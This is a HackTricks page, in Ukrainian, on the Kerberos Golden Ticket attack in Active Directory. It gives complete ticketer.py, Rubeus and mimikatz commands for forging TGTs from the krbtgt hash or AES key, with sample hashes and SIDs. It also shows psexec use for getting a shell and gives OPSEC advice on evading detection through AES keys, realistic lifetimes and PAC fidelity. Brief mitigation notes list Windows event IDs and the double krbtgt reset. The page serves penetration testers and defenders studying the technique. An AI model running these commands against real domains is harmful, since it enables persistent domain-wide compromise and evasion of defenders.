# Golden Ticket

{{#include ../../banners/hacktricks-training.md}}

## Golden ticket

**Golden Ticket**-атака полягає у **створенні легітимного Ticket Granting Ticket (TGT), що імітує будь-якого користувача**, через використання **NTLM hash облікового запису krbtgt у Active Directory (AD)**. Ця техніка особливо вигідна, оскільки **надає доступ до будь-якого сервісу або машини** в межах домену від імені скомпрометованого користувача. Важливо пам’ятати, що **облікові дані акаунта krbtgt ніколи не оновлюються автоматично**.

Щоб **отримати NTLM hash** облікового запису krbtgt, можна використовувати різні методи. Його можна витягти з процесу **Local Security Authority Subsystem Service (LSASS)** або з файлу **NT Directory Services (NTDS.dit)**, розташованого на будь-якому Domain Controller (DC) у межах домену. Крім того, **виконання DCsync attack** є ще однією стратегією для отримання цього NTLM hash; це можна зробити за допомогою таких інструментів, як модуль **lsadump::dcsync** у Mimikatz або скрипт **secretsdump.py** в Impacket. Важливо підкреслити, що для виконання цих операцій зазвичай **потрібні привілеї domain admin або доступ подібного рівня**.

Хоча NTLM hash є придатним методом для цієї мети, **наполегливо рекомендується** **forge tickets using the Advanced Encryption Standard (AES) Kerberos keys (AES128 and AES256)** з міркувань operational security. Це ще важливіше в сучасних доменах, оскільки **використання RC4 поступово виводиться з ужитку** і набагато помітніше виділяється в Kerberos telemetry.
```bash:From Linux
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```

```bash:From Windows
# Rubeus
## The /ldap command will get the details from the LDAP (so you don't need to put the SID)
## The /printcmd option will print the complete command if later you want to generate a token offline
.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd

# Example
.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap

#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
### Сучасні нотатки щодо crafting ticket

Коли можливо, **спочатку робіть query LDAP і SYSVOL**, а потім forge ticket, використовуючи реальну domain policy та значення user PAC замість того, щоб вигадувати їх вручну:
```bash
Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap
```
- `/ldap` запитує у DC дані про user, group, NetBIOS і policy, які використовуються для побудови більш реалістичного PAC.
- `/printcmd` виводить offline command line, що містить отримані поля PAC, що корисно, якщо пізніше ви захочете forge той самий ticket без повторного звернення до LDAP.
- `/extendedupndns` додає новіші елементи PAC `UpnDns`, що містять `samAccountName` і account SID.
- `/oldpac` видаляє новіші буфери PAC `Requestor` і `Attributes`; це переважно корисно для compatibility testing зі старішими середовищами, а не для default tradecraft.

From Linux, recent Impacket versions also support додавання новіших структур PAC і встановлення реалістичного validity period:
```bash
python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-user-id 500 -groups 512,513,518,519 -duration 10 \
-extra-pac administrator
```
- `-duration` у **годинах**. Значення за замовчуванням — **10 years**, що є шумним.
- `-extra-pac` додає новішу інформацію PAC `UPN_DNS`.
- `-old-pac` примусово вмикає legacy PAC layout.
- `-extra-sid` корисний, коли PAC потребує додаткових SID (наприклад, у сценаріях ескалації child-to-parent, які описані в [SID-History Injection](sid-history-injection.md)).

**Після того як** ви **інжектнули golden Ticket**, ви можете отримати доступ до shared files **(C$)**, а також виконувати services і WMI, тож можете використати **psexec** або **wmiexec** для отримання shell (схоже, через winrm shell отримати не вийде).

### Bypassing common detections

Найчастіший спосіб виявити golden ticket — це **аналіз Kerberos traffic** у мережі. За замовчуванням Mimikatz **підписує TGT на 10 years**, що буде помітно як аномалія в подальших TGS requests, зроблених із ним.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Використовуйте параметри `/startoffset`, `/endin` і `/renewmax`, щоб керувати start offset, duration і maximum renewals (усі в хвилинах).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
На жаль, час життя TGT не записується в 4769, тож ви не знайдете цю інформацію у журналах подій Windows. Однак те, що можна зіставити, — це **наявність 4769 без попереднього 4768**. **Неможливо запросити TGS без TGT**, і якщо немає запису про виданий TGT, можна зробити висновок, що його було підроблено офлайн.

У **новіших збірках Windows** Event IDs **4768** і **4769** також показують значно кращу **телеметрію типу шифрування**. Підроблений TGT/TGS з використанням **RC4 (`0x17`)** у домені, де `krbtgt`, клієнти та сервіси вже мають AES keys, набагато легше виявити, ніж кілька років тому. Це ще одна причина віддавати перевагу **AES-backed Golden Tickets** і максимально точно відтворювати звичайну Kerberos policy домену.

Ще одна проблема OPSEC — **PAC fidelity**. Тікети з неможливими груповими членствами, відсутніми новішими PAC buffers або метаданими облікового запису, що не збігаються з LDAP, легше виявити, коли захисники перевіряють вміст PAC за даними AD. Якщо вам потрібен TGT, який виглядає так, ніби його справді видав DC, перегляньте:

{{#ref}}
diamond-ticket.md
{{#endref}}

Також існують **обмеження середовища** для persistence. Обліковий запис `krbtgt` має **password history of 2**, тому підроблений TGT може залишатися чинним після **першого** скидання `krbtgt`, якщо він був підписаний попереднім key. Саме тому захисники роблять Golden Tickets недійсними, **двічі скидаючи `krbtgt`** і чекаючи щонайменше максимальний ticket lifetime домену між скиданнями.

Щоб **обійти це виявлення**, перевірте diamond tickets.

### Mitigation

- 4624: Account Logon
- 4672: Admin Logon
- `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Інші невеликі прийоми, які можуть використовувати захисники, — це **alert on 4769's for sensitive users** таких як стандартний обліковий запис доменного адміністратора та сповіщення про **RC4 usage for `krbtgt`** у доменах, які зазвичай видають AES tickets.

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

{{#include ../../banners/hacktricks-training.md}}
